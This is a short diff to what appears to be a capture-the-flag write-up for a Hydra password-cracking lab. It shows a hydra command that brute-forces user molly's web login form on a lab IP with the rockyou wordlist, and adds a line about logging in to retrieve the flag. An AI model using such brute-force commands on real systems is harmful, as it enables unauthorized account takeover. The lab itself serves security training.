@@ -8,7 +8,7 @@
 ```
 hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.184.83 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
--
+- Then login to page using login and password and you will get the flag
 
 ### Task 2
 #### Use Hydra to bruteforce molly's SSH password. What is flag 2?
